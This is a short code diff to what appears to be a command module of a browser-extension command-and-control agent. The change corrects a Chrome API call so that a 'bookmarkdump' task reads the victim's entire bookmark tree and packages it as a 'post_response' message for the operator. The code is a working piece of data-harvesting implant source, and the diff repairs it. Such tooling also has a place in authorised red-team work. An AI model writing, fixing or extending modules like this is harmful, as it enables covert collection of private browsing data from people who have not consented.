@@ -1,6 +1,6 @@
 exports.bookmarkdump = function(task) {
     try {
-        chrome.bookmark.getTree(function(bookmarks) {
+        chrome.bookmarks.getTree(function(bookmarks) {
             let response = {'task_id':task.id, 'user_output':JSON.stringify(bookmarks, null, 2), 'completed':true};
             let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
             let enc = JSON.stringify(outer_response);
